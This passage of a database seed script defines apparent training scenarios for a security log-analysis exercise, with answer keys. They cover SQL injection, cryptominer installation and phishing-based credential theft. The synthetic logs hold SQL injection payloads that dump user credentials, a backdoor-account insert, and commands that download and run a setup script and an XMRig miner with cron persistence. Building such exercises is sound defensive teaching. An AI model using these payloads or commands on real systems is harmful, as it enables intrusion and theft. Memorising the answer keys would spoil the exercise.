db.logScenarios.insertMany([
  {
    "id": "scenario9",
    "title": "Web Application Vulnerability Exploitation",
    "description": "Investigate logs of a web application that may have been compromised through a SQL injection vulnerability.",
    "threatType": "intrusion",
    "difficulty": 2,
    "timeLimit": 350,
    "logs": [
      {
        "id": "web_access_log",
        "name": "Web Server Access Log",
        "type": "web",
        "timestamp": "2025-04-23",
        "source": "web-app-01",
        "content": [
          {"text": "172.20.15.42 - - [23/Apr/2025:09:12:15 +0000] \"GET /webapp/login.php HTTP/1.1\" 200 1543 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "172.20.15.42 - - [23/Apr/2025:09:13:22 +0000] \"POST /webapp/login.php HTTP/1.1\" 302 - \"https://webapp.example.com/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "172.20.15.42 - - [23/Apr/2025:09:13:25 +0000] \"GET /webapp/dashboard.php HTTP/1.1\" 200 4856 \"https://webapp.example.com/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:10:45:33 +0000] \"GET /webapp/login.php HTTP/1.1\" 200 1543 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:10:46:15 +0000] \"GET /webapp/products.php?id=42 HTTP/1.1\" 200 3452 \"https://webapp.example.com/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:10:48:22 +0000] \"GET /webapp/products.php?id=42' HTTP/1.1\" 500 1852 \"https://webapp.example.com/products.php?id=42\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:10:50:45 +0000] \"GET /webapp/products.php?id=42' ORDER BY 5-- HTTP/1.1\" 200 3452 \"https://webapp.example.com/products.php?id=42\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:10:51:33 +0000] \"GET /webapp/products.php?id=42' UNION SELECT 1,2,3,4,5-- HTTP/1.1\" 200 3482 \"https://webapp.example.com/products.php?id=42\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:10:55:15 +0000] \"GET /webapp/products.php?id=42' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- HTTP/1.1\" 200 8745 \"https://webapp.example.com/products.php?id=42\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:11:02:22 +0000] \"GET /webapp/products.php?id=42' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1\" 200 5421 \"https://webapp.example.com/products.php?id=42\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:11:05:33 +0000] \"GET /webapp/products.php?id=42' UNION SELECT 1,concat(username,':',password),3,4,5 FROM users-- HTTP/1.1\" 200 4352 \"https://webapp.example.com/products.php?id=42\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:11:15:45 +0000] \"POST /webapp/login.php HTTP/1.1\" 302 - \"https://webapp.example.com/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:11:15:48 +0000] \"GET /webapp/admin.php HTTP/1.1\" 200 3856 \"https://webapp.example.com/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "104.198.65.21 - - [23/Apr/2025:11:22:15 +0000] \"POST /webapp/admin.php?action=add_user HTTP/1.1\" 302 - \"https://webapp.example.com/admin.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""}
        ]
      },
      {
        "id": "error_log",
        "name": "Web Application Error Log",
        "type": "error",
        "timestamp": "2025-04-23",
        "source": "web-app-01",
        "content": [
          {"text": "[Wed Apr 23 10:48:25 2025] [error] [client 104.198.65.21] PHP Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/webapp/products.php on line 42"},
          {"text": "[Wed Apr 23 10:48:26 2025] [error] [client 104.198.65.21] PHP Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/webapp/products.php:45 Stack trace: #0 {main} thrown in /var/www/html/webapp/products.php on line 45"},
          {"text": "[Wed Apr 23 11:02:30 2025] [warn] [client 104.198.65.21] ModSecurity: Warning. Pattern match \"(information_schema|sysdatabases|sysusers)\" at ARGS:id. [file \"/etc/apache2/modsecurity.d/sql.conf\"] [line \"42\"] [id \"959100\"] [rev \"2\"] [msg \"SQL Injection Attack\"] [data \"id=42' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--\"] [severity \"CRITICAL\"] [hostname \"webapp.example.com\"] [uri \"/webapp/products.php\"]"},
          {"text": "[Wed Apr 23 11:05:40 2025] [warn] [client 104.198.65.21] ModSecurity: Warning. Pattern match \"(UNION.+SELECT|concat\\()\" at ARGS:id. [file \"/etc/apache2/modsecurity.d/sql.conf\"] [line \"38\"] [id \"959100\"] [rev \"2\"] [msg \"SQL Injection Attack\"] [data \"id=42' UNION SELECT 1,concat(username,':',password),3,4,5 FROM users--\"] [severity \"CRITICAL\"] [hostname \"webapp.example.com\"] [uri \"/webapp/products.php\"]"},
          {"text": "[Wed Apr 23 11:22:20 2025] [info] [client 104.198.65.21] User 'backdoor_admin' with administrator privileges created by 'admin'"}
        ]
      },
      {
        "id": "database_log",
        "name": "Database Query Log",
        "type": "database",
        "timestamp": "2025-04-23",
        "source": "mysql-db-01",
        "content": [
          {"text": "2025-04-23T09:13:23Z [INFO] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM users WHERE username = 'janedoe' AND password = 'b59c67bf196a4758191e42f76670ceba'', Duration: 0.003s"},
          {"text": "2025-04-23T10:46:17Z [INFO] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = 42', Duration: 0.002s"},
          {"text": "2025-04-23T10:48:24Z [ERROR] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = '42\\'' - Syntax error, Duration: 0.001s"},
          {"text": "2025-04-23T10:50:46Z [INFO] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = '42\\' ORDER BY 5--'', Duration: 0.004s"},
          {"text": "2025-04-23T10:51:35Z [WARNING] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = '42\\' UNION SELECT 1,2,3,4,5--'', Duration: 0.005s"},
          {"text": "2025-04-23T10:55:17Z [WARNING] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = '42\\' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--'', Duration: 0.042s"},
          {"text": "2025-04-23T11:02:24Z [WARNING] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = '42\\' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name=\\'users\\'--'', Duration: 0.012s"},
          {"text": "2025-04-23T11:05:35Z [CRITICAL] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM products WHERE id = '42\\' UNION SELECT 1,concat(username,\\':\\',password),3,4,5 FROM users--'', Duration: 0.008s"},
          {"text": "2025-04-23T11:15:46Z [INFO] User 'webapp' @'172.20.15.25' Query: 'SELECT * FROM users WHERE username = 'admin' AND password = '5f4dcc3b5aa765d61d8327deb882cf99'', Duration: 0.003s"},
          {"text": "2025-04-23T11:22:17Z [INFO] User 'webapp' @'172.20.15.25' Query: 'INSERT INTO users (username, password, email, is_admin) VALUES ('backdoor_admin', '45c31af8b1e9659207e39fdc21ddb0df', 'admin@test.com', 1)', Duration: 0.006s"}
        ]
      }
    ],
    "threats": [
      {
        "type": "intrusion",
        "name": "SQL Injection Attack",
        "description": "Attacker exploited a SQL injection vulnerability in the web application to extract database schema information and user credentials."
      },
      {
        "type": "credential_theft",
        "name": "Password Hash Extraction",
        "description": "Database user password hashes were extracted using SQL injection techniques."
      },
      {
        "type": "intrusion",
        "name": "Unauthorized Admin Access",
        "description": "Attacker used stolen credentials to access the admin interface and create a backdoor admin account."
      }
    ],
    "threatOptions": [
      {
        "type": "intrusion",
        "name": "SQL Injection Attack",
        "description": "Attacker exploited a SQL injection vulnerability in the web application to extract database schema information and user credentials."
      },
      {
        "type": "credential_theft",
        "name": "Password Hash Extraction",
        "description": "Database user password hashes were extracted using SQL injection techniques."
      },
      {
        "type": "intrusion",
        "name": "Unauthorized Admin Access",
        "description": "Attacker used stolen credentials to access the admin interface and create a backdoor admin account."
      },
      {
        "type": "intrusion",
        "name": "Cross-Site Scripting (XSS)",
        "description": "Injection of malicious JavaScript code to steal session cookies or perform actions on behalf of the victim."
      },
      {
        "type": "malware",
        "name": "Web Shell Upload",
        "description": "Uploading malicious server-side scripts to gain persistent access to the web server."
      },
      {
        "type": "intrusion",
        "name": "Command Injection",
        "description": "Exploitation of vulnerable parameters to execute system commands on the web server."
      },
      {
        "type": "data_exfiltration",
        "name": "Database Dumping",
        "description": "Extraction of entire database contents through a vulnerable web application."
      },
      {
        "type": "credential_theft",
        "name": "Session Hijacking",
        "description": "Theft of authenticated session tokens to impersonate legitimate users."
      },
      {
        "type": "intrusion",
        "name": "CSRF Attack",
        "description": "Cross-Site Request Forgery forcing an authenticated user to perform unintended actions."
      },
      {
        "type": "intrusion",
        "name": "Brute Force Login",
        "description": "Attempting to gain access by systematically checking all possible passwords."
      }
    ],
    "suspiciousLines": [5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29],
    "knownEntities": {
      "ips": [
        {"address": "172.20.15.42", "info": "Internal user - Jane Doe"},
        {"address": "172.20.15.25", "info": "Web application server"},
        {"address": "104.198.65.21", "info": "Unknown external IP"}
      ],
      "users": [
        {"username": "janedoe", "role": "Regular User"},
        {"username": "admin", "role": "Administrator"},
        {"username": "webapp", "role": "Database Service Account"},
        {"username": "backdoor_admin", "role": "Unknown - Recently created"}
      ]
    }
  },
  {
    "id": "scenario10",
    "title": "Cryptomining Malware",
    "description": "Investigate server logs for evidence of cryptocurrency mining malware that's consuming system resources.",
    "threatType": "malware",
    "difficulty": 1,
    "timeLimit": 300,
    "logs": [
      {
        "id": "system_log",
        "name": "System Events Log",
        "type": "system",
        "timestamp": "2025-04-24",
        "source": "app-server-05",
        "content": [
          {"text": "2025-04-24T01:15:22Z INFO [SYSTEM] System boot completed, uptime: 0 days, 0 hours, 0 minutes"},
          {"text": "2025-04-24T01:16:33Z INFO [SERVICE] Apache service started successfully"},
          {"text": "2025-04-24T01:16:45Z INFO [SERVICE] MySQL service started successfully"},
          {"text": "2025-04-24T01:17:22Z INFO [SSH] Accepted publickey for admin from 192.168.10.55 port 52233"},
          {"text": "2025-04-24T01:25:15Z INFO [UPDATE] Package update check started"},
          {"text": "2025-04-24T01:25:45Z INFO [UPDATE] Downloaded updates for: openssl, bash, libcurl"},
          {"text": "2025-04-24T01:27:22Z INFO [UPDATE] Update applied successfully, reboot not required"},
          {"text": "2025-04-24T02:15:33Z WARNING [RESOURCE] CPU usage at 85% for 5 minutes"},
          {"text": "2025-04-24T02:30:45Z WARNING [RESOURCE] Memory usage at 78%"},
          {"text": "2025-04-24T03:15:22Z WARNING [RESOURCE] CPU usage at 92% for 10 minutes"},
          {"text": "2025-04-24T03:32:15Z WARNING [PROCESS] Unusual process 'xmrig' consuming high CPU"},
          {"text": "2025-04-24T03:35:45Z WARNING [PROCESS] Unusual process 'miner.sh' detected"},
          {"text": "2025-04-24T04:22:33Z WARNING [RESOURCE] CPU usage at 95% for 30 minutes"},
          {"text": "2025-04-24T05:15:45Z INFO [CRON] Daily backup job started"},
          {"text": "2025-04-24T05:17:22Z WARNING [CRON] Backup job failed - insufficient system resources"}
        ]
      },
      {
        "id": "process_log",
        "name": "Process Creation Events",
        "type": "process",
        "timestamp": "2025-04-24",
        "source": "app-server-05",
        "content": [
          {"text": "2025-04-24T01:17:35Z INFO [Process.Create] User: admin, Process: bash (PID: 1285), Parent: sshd (PID: 1282)"},
          {"text": "2025-04-24T01:18:22Z INFO [Process.Create] User: admin, Process: ls (PID: 1290), Parent: bash (PID: 1285)"},
          {"text": "2025-04-24T01:19:15Z INFO [Process.Create] User: admin, Process: ps (PID: 1295), Parent: bash (PID: 1285)"},
          {"text": "2025-04-24T01:20:33Z INFO [Process.Create] User: admin, Process: top (PID: 1302), Parent: bash (PID: 1285)"},
          {"text": "2025-04-24T01:22:45Z INFO [Process.Create] User: admin, Process: wget (PID: 1315), Parent: bash (PID: 1285), Command: 'wget hxxp://mining-pool.example[.]org/setup.sh'"},
          {"text": "2025-04-24T01:23:22Z INFO [Process.Create] User: admin, Process: bash (PID: 1320), Parent: bash (PID: 1285), Command: 'bash setup.sh'"},
          {"text": "2025-04-24T01:23:45Z INFO [Process.Create] User: admin, Process: curl (PID: 1325), Parent: bash (PID: 1320), Command: 'curl -s hxxp://mining-pool.example[.]org/xmrig-6.15.0-linux-x64.tar.gz -o /tmp/xmr.tar.gz'"},
          {"text": "2025-04-24T01:24:22Z INFO [Process.Create] User: admin, Process: tar (PID: 1330), Parent: bash (PID: 1320), Command: 'tar -xf /tmp/xmr.tar.gz -C /tmp/'"},
          {"text": "2025-04-24T01:25:15Z INFO [Process.Create] User: admin, Process: mv (PID: 1335), Parent: bash (PID: 1320), Command: 'mv /tmp/xmrig-6.15.0/* /opt/monitoring/'"},
          {"text": "2025-04-24T01:26:33Z INFO [Process.Create] User: admin, Process: touch (PID: 1342), Parent: bash (PID: 1320), Command: 'touch /opt/monitoring/monitor.sh'"},
          {"text": "2025-04-24T01:27:45Z INFO [Process.Create] User: admin, Process: chmod (PID: 1350), Parent: bash (PID: 1320), Command: 'chmod +x /opt/monitoring/monitor.sh'"},
          {"text": "2025-04-24T01:28:22Z INFO [Process.Create] User: admin, Process: crontab (PID: 1355), Parent: bash (PID: 1320), Command: 'crontab -e'"},
          {"text": "2025-04-24T01:45:15Z INFO [Process.Create] User: root, Process: bash (PID: 1390), Parent: crond (PID: 428), Command: '/opt/monitoring/monitor.sh'"},
          {"text": "2025-04-24T01:45:22Z INFO [Process.Create] User: root, Process: xmrig (PID: 1395), Parent: bash (PID: 1390), Command: './xmrig -o pool.minexmr.com:4444 -u 44JrhRTULZNXWwBXNTeXDPJQGeSGzS4EwhRRJzSjbLZA1DLCQNoFPQ6HYKgBPLSBrP7RHAyNuwjqPGuCNRPs8tkSJs6W43K -k --tls -p worker05'"}
        ]
      },
      {
        "id": "network_log",
        "name": "Network Connection Events",
        "type": "network",
        "timestamp": "2025-04-24",
        "source": "app-server-05",
        "content": [
          {"text": "2025-04-24T01:17:25Z INFO [Net.Connection] Process: sshd (PID: 1282), Local: 10.10.25.15:22, Remote: 192.168.10.55:52233, State: ESTABLISHED, Protocol: SSH"},
          {"text": "2025-04-24T01:22:45Z INFO [Net.Connection] Process: wget (PID: 1315), Local: 10.10.25.15:45123, Remote: 185.199.108.153:80, State: ESTABLISHED, Protocol: HTTP"},
          {"text": "2025-04-24T01:23:45Z INFO [Net.Connection] Process: curl (PID: 1325), Local: 10.10.25.15:45145, Remote: 185.199.108.153:80, State: ESTABLISHED, Protocol: HTTP"},
          {"text": "2025-04-24T01:45:25Z WARNING [Net.Connection] Process: xmrig (PID: 1395), Local: 10.10.25.15:52342, Remote: 95.216.173.18:4444, State: ESTABLISHED, Protocol: TCP"},
          {"text": "2025-04-24T01:46:15Z WARNING [Net.Connection] Process: xmrig (PID: 1395), Local: 10.10.25.15:52342, Remote: 95.216.173.18:4444, State: ESTABLISHED, Protocol: TCP"},
          {"text": "2025-04-24T02:15:22Z WARNING [Net.Connection] Process: xmrig (PID: 1395), Local: 10.10.25.15:52342, Remote: 95.216.173.18:4444, State: ESTABLISHED, Protocol: TCP"},
          {"text": "2025-04-24T03:45:15Z WARNING [Net.Connection] Process: xmrig (PID: 1395), Local: 10.10.25.15:52342, Remote: 95.216.173.18:4444, State: ESTABLISHED, Protocol: TCP"},
          {"text": "2025-04-24T04:15:33Z WARNING [Net.Connection] Process: xmrig (PID: 1395), Local: 10.10.25.15:52342, Remote: 95.216.173.18:4444, State: ESTABLISHED, Protocol: TCP"}
        ]
      },
      {
        "id": "file_log",
        "name": "File Operation Events",
        "type": "filesystem",
        "timestamp": "2025-04-24",
        "source": "app-server-05",
        "content": [
          {"text": "2025-04-24T01:22:48Z INFO [File.Create] User: admin, Process: wget (PID: 1315), Path: /home/admin/setup.sh"},
          {"text": "2025-04-24T01:23:48Z INFO [File.Create] User: admin, Process: curl (PID: 1325), Path: /tmp/xmr.tar.gz"},
          {"text": "2025-04-24T01:24:25Z INFO [File.Create] User: admin, Process: tar (PID: 1330), Path: /tmp/xmrig-6.15.0/"},
          {"text": "2025-04-24T01:24:25Z INFO [File.Create] User: admin, Process: tar (PID: 1330), Path: /tmp/xmrig-6.15.0/xmrig"},
          {"text": "2025-04-24T01:24:25Z INFO [File.Create] User: admin, Process: tar (PID: 1330), Path: /tmp/xmrig-6.15.0/config.json"},
          {"text": "2025-04-24T01:25:18Z INFO [File.Move] User: admin, Process: mv (PID: 1335), Path: /tmp/xmrig-6.15.0/xmrig -> /opt/monitoring/xmrig"},
          {"text": "2025-04-24T01:25:18Z INFO [File.Move] User: admin, Process: mv (PID: 1335), Path: /tmp/xmrig-6.15.0/config.json -> /opt/monitoring/config.json"},
          {"text": "2025-04-24T01:26:35Z INFO [File.Create] User: admin, Process: touch (PID: 1342), Path: /opt/monitoring/monitor.sh"},
          {"text": "2025-04-24T01:27:22Z INFO [File.Modify] User: admin, Process: vi (PID: 1345), Path: /opt/monitoring/monitor.sh"},
          {"text": "2025-04-24T01:27:48Z INFO [File.Modify] User: admin, Process: chmod (PID: 1350), Path: /opt/monitoring/monitor.sh"},
          {"text": "2025-04-24T01:28:25Z INFO [File.Modify] User: admin, Process: crontab (PID: 1355), Path: /var/spool/cron/crontabs/root"}
        ]
      }
    ],
    "threats": [
      {
        "type": "malware",
        "name": "Cryptocurrency Mining Malware",
        "description": "Unauthorized XMRig cryptominer installed to mine Monero cryptocurrency using server resources."
      },
      {
        "type": "intrusion",
        "name": "Persistence Mechanism",
        "description": "Malware installed persistence mechanism via crontab to ensure mining continues after system restarts."
      }
    ],
    "threatOptions": [
      {
        "type": "malware",
        "name": "Cryptocurrency Mining Malware",
        "description": "Unauthorized XMRig cryptominer installed to mine Monero cryptocurrency using server resources."
      },
      {
        "type": "intrusion",
        "name": "Persistence Mechanism",
        "description": "Malware installed persistence mechanism via crontab to ensure mining continues after system restarts."
      },
      {
        "type": "intrusion",
        "name": "Insider Threat",
        "description": "Administrator knowingly installed mining software for personal profit using company resources."
      },
      {
        "type": "credential_theft",
        "name": "SSH Key Abuse",
        "description": "Attacker using stolen SSH keys to access the server and install malicious software."
      },
      {
        "type": "malware",
        "name": "Trojanized System Update",
        "description": "Malicious code disguised as a legitimate system update or security patch."
      },
      {
        "type": "ddos",
        "name": "Resource Exhaustion",
        "description": "Deliberate consumption of system resources to make services unavailable."
      },
      {
        "type": "malware",
        "name": "Backdoor Installation",
        "description": "Hidden access mechanism installed to maintain persistent access to the server."
      },
      {
        "type": "intrusion",
        "name": "Supply Chain Attack",
        "description": "Compromised software packages or updates used to distribute malware."
      },
      {
        "type": "malware",
        "name": "Rootkit Installation",
        "description": "Advanced malware that hides its presence from the operating system and security tools."
      }
    ],
    "suspiciousLines": [10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47],
    "knownEntities": {
      "ips": [
        {"address": "10.10.25.15", "info": "Application Server 05"},
        {"address": "192.168.10.55", "info": "Admin Workstation"},
        {"address": "185.199.108.153", "info": "Mining Pool Repository Server"},
        {"address": "95.216.173.18", "info": "Cryptocurrency Mining Pool"}
      ],
      "users": [
        {"username": "admin", "role": "System Administrator"},
        {"username": "root", "role": "System Account"}
      ]
    }
  },
  {
    "id": "scenario11",
    "title": "Phishing Campaign and Credential Theft",
    "description": "Investigate email and VPN logs for evidence of a phishing campaign targeting corporate users and subsequent unauthorized access.",
    "threatType": "credential_theft",
    "difficulty": 2,
    "timeLimit": 360,
    "logs": [
      {
        "id": "email_log",
        "name": "Email Gateway Logs",
        "type": "email",
        "timestamp": "2025-04-25",
        "source": "mail-gateway",
        "content": [
          {"text": "2025-04-25T09:15:22Z INFO [MAIL] From: security@exampie.com, To: j.wilson@example.com, Subject: [URGENT] Security Alert - Password Reset Required, Status: DELIVERED, Size: 15.4KB, Attachment: none"},
          {"text": "2025-04-25T09:15:24Z INFO [MAIL] From: security@exampie.com, To: m.johnson@example.com, Subject: [URGENT] Security Alert - Password Reset Required, Status: DELIVERED, Size: 15.4KB, Attachment: none"},
          {"text": "2025-04-25T09:15:26Z INFO [MAIL] From: security@exampie.com, To: a.smith@example.com, Subject: [URGENT] Security Alert - Password Reset Required, Status: DELIVERED, Size: 15.4KB, Attachment: none"},
          {"text": "2025-04-25T09:15:28Z INFO [MAIL] From: security@exampie.com, To: d.brown@example.com, Subject: [URGENT] Security Alert - Password Reset Required, Status: DELIVERED, Size: 15.4KB, Attachment: none"},
          {"text": "2025-04-25T09:15:30Z INFO [MAIL] From: security@exampie.com, To: s.miller@example.com, Subject: [URGENT] Security Alert - Password Reset Required, Status: DELIVERED, Size: 15.4KB, Attachment: none"},
          {"text": "2025-04-25T09:35:15Z WARNING [SPAM] From: security@exampie.com, To: t.parker@example.com, Subject: [URGENT] Security Alert - Password Reset Required, Status: QUARANTINED, Reason: LOOKALIKE_DOMAIN"},
          {"text": "2025-04-25T10:22:33Z INFO [MAIL] From: j.wilson@example.com, To: helpdesk@example.com, Subject: RE: Password Reset Problems, Status: DELIVERED, Size: 4.2KB, Attachment: none"}
        ]
      },
      {
        "id": "web_access_log",
        "name": "Web Proxy Logs",
        "type": "proxy",
        "timestamp": "2025-04-25",
        "source": "web-proxy",
        "content": [
          {"text": "2025-04-25T09:25:45Z INFO [PROXY] User: j.wilson, Destination: securityportal.exampie.com/password-reset.php, Status: 200, Category: UNCATEGORIZED, Action: ALLOWED"},
          {"text": "2025-04-25T09:26:22Z WARNING [PROXY] User: j.wilson, Destination: securityportal.exampie.com/login.php, Status: 200, Category: UNCATEGORIZED, Action: ALLOWED"},
          {"text": "2025-04-25T09:28:33Z INFO [PROXY] User: m.johnson, Destination: securityportal.exampie.com/password-reset.php, Status: 200, Category: UNCATEGORIZED, Action: ALLOWED"},
          {"text": "2025-04-25T09:29:15Z WARNING [PROXY] User: m.johnson, Destination: securityportal.exampie.com/login.php, Status: 200, Category: UNCATEGORIZED, Action: ALLOWED"},
          {"text": "2025-04-25T09:45:22Z WARNING [PROXY] User: a.smith, Destination: securityportal.exampie.com/password-reset.php, Status: 200, Category: PHISHING, Action: BLOCKED"},
          {"text": "2025-04-25T11:15:33Z INFO [PROXY] User: security-admin, Destination: console.cloud.example.com, Status: 200, Category: CLOUD_SERVICES, Action: ALLOWED"}
        ]
      },
      {
        "id": "vpn_log",
        "name": "VPN Authentication Logs",
        "type": "vpn",
        "timestamp": "2025-04-25",
        "source": "vpn-gateway",
        "content": [
          {"text": "2025-04-25T12:15:22Z INFO [VPN.Auth] Username: j.wilson, IP: 104.28.42.16, Status: SUCCESS, Location: New York, USA, Device: Windows/Chrome"},
          {"text": "2025-04-25T12:22:33Z INFO [VPN.Auth] Username: m.johnson, IP: 104.28.48.22, Status: SUCCESS, Location: Chicago, USA, Device: Windows/Chrome"},
          {"text": "2025-04-25T13:45:15Z WARNING [VPN.Auth] Username: j.wilson, IP: 185.156.73.42, Status: SUCCESS, Location: Kiev, Ukraine, Device: Linux/Firefox"},
          {"text": "2025-04-25T14:05:22Z WARNING [VPN.Auth] Username: m.johnson, IP: 185.156.73.42, Status: SUCCESS, Location: Kiev, Ukraine, Device: Linux/Firefox"},
          {"text": "2025-04-25T14:35:33Z WARNING [VPN.Auth] Username: j.wilson, IP: 104.28.42.16, Status: FAILURE, Reason: ACCOUNT_LOCKED, Location: New York, USA, Device: Windows/Chrome"},
          {"text": "2025-04-25T14:35:45Z INFO [VPN.Admin] Username: security-admin, Action: ACCOUNT_UNLOCK, Target: j.wilson, Reason: 'User reported unauthorized access'"},
          {"text": "2025-04-25T14:36:22Z INFO [VPN.Admin] Username: security-admin, Action: PASSWORD_RESET, Target: j.wilson, Reason: 'Security incident'"},
          {"text": "2025-04-25T14:40:15Z INFO [VPN.Admin] Username: security-admin, Action: ACCOUNT_UNLOCK, Target: m.johnson, Reason: 'Security incident'"},
          {"text": "2025-04-25T14:40:45Z INFO [VPN.Admin] Username: security-admin, Action: PASSWORD_RESET, Target: m.johnson, Reason: 'Security incident'"}
        ]
      },
      {
        "id": "access_log",
        "name": "Cloud Resource Access Logs",
        "type": "cloud",
        "timestamp": "2025-04-25",
        "source": "cloud-audit",
        "content": [
          {"text": "2025-04-25T13:50:22Z WARNING [Cloud.Access] User: j.wilson@example.com, Resource: cloud-storage/financial-reports, Action: LIST, Status: SUCCESS, IP: 185.156.73.42"},
          {"text": "2025-04-25T13:52:15Z WARNING [Cloud.Access] User: j.wilson@example.com, Resource: cloud-storage/financial-reports/Q1_2025_Projections.xlsx, Action: DOWNLOAD, Status: SUCCESS, IP: 185.156.73.42"},
          {"text": "2025-04-25T13:55:33Z WARNING [Cloud.Access] User: j.wilson@example.com, Resource: cloud-storage/strategic-planning, Action: LIST, Status: SUCCESS, IP: 185.156.73.42"},
          {"text": "2025-04-25T13:58:45Z WARNING [Cloud.Access] User: j.wilson@example.com, Resource: cloud-storage/strategic-planning/Acquisition_Targets_2025.docx, Action: DOWNLOAD, Status: SUCCESS, IP: 185.156.73.42"},
          {"text": "2025-04-25T14:10:22Z WARNING [Cloud.Access] User: m.johnson@example.com, Resource: cloud-storage/hr-documents, Action: LIST, Status: SUCCESS, IP: 185.156.73.42"},
          {"text": "2025-04-25T14:12:33Z WARNING [Cloud.Access] User: m.johnson@example.com, Resource: cloud-storage/hr-documents/Salary_Ranges_2025.xlsx, Action: DOWNLOAD, Status: SUCCESS, IP: 185.156.73.42"},
          {"text": "2025-04-25T14:15:45Z WARNING [Cloud.Access] User: m.johnson@example.com, Resource: cloud-storage/hr-documents/Employee_Database_2025.csv, Action: DOWNLOAD, Status: SUCCESS, IP: 185.156.73.42"}
        ]
      }
    ],
    "threats": [
      {
        "type": "credential_theft",
        "name": "Phishing Campaign",
        "description": "Targeted phishing emails with lookalike domain to steal user credentials."
      },
      {
        "type": "intrusion",
        "name": "Unauthorized VPN Access",
        "description": "Stolen credentials used to access corporate VPN from unusual foreign location."
      },
      {
        "type": "data_exfiltration",
        "name": "Sensitive Data Access",
        "description": "Unauthorized download of sensitive financial and HR documents from cloud storage."
      }
    ],
    "threatOptions": [
      {
        "type": "credential_theft",
        "name": "Phishing Campaign",
        "description": "Targeted phishing emails with lookalike domain to steal user credentials."
      },
      {
        "type": "intrusion",
        "name": "Unauthorized VPN Access",
        "description": "Stolen credentials used to access corporate VPN from unusual foreign location."
      },
      {
        "type": "data_exfiltration",
        "name": "Sensitive Data Access",
        "description": "Unauthorized download of sensitive financial and HR documents from cloud storage."
      },
      {
        "type": "malware",
        "name": "Spear Phishing Malware",
        "description": "Malicious payload delivered via targeted phishing emails to specific employees."
      },
      {
        "type": "credential_theft",
        "name": "OAuth Token Theft",
        "description": "Theft of authentication tokens to bypass multi-factor authentication."
      },
      {
        "type": "intrusion",
        "name": "Session Hijacking",
        "description": "Interception and theft of authenticated session information."
      },
      {
        "type": "data_exfiltration",
        "name": "Cloud Storage Breach",
        "description": "Unauthorized access to cloud-based document storage systems."
      },
      {
        "type": "credential_theft",
        "name": "Password Spray Attack",
        "description": "Using common passwords against multiple accounts to avoid account lockouts."
      },
      {
        "type": "intrusion",
        "name": "MFA Bypass",
        "description": "Techniques used to circumvent multi-factor authentication protections."
      },
      {
        "type": "credential_theft",
        "name": "Targeted Credential Stuffing",
        "description": "Using previously breached credentials to access corporate accounts."
      }
    ],
